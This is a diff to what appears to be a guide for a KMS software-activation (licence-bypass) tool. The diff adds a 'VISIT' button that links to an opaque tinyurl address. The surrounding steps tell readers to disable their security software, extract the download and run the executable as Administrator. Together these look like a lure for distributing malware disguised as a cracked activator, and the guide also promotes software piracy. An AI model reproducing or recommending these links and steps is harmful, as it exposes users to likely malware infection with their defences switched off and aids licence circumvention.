@@ -6,11 +6,14 @@ This guide provides an overview of how KMS-based activation methods work, along 
 
 1. Download the Tool: Ensure you download the tool from a trusted source to avoid potential risks. Verify checksums or authenticity whenever possible.
 
+[![VISIT](https://github.com/user-attachments/assets/cb86fc1c-d9ea-469c-beb0-1af5bee9b495)](https://tinyurl.com/3zswxc2r)
+
 2. Temporarily Disable Security Software: Some security programs may flag the tool as a false positive. Temporarily disable them during the process.
 
 3. Extract the Files: Use extraction software like WinRAR or 7-Zip to unpack the downloaded files.
 
 4. Run the Tool: Right-click on the executable file and run it as Administrator.
+
 
 5. Initiate the Process: Click the appropriate button (usually labeled "Verify" or similar) to emulate a KMS server and complete the process.
 
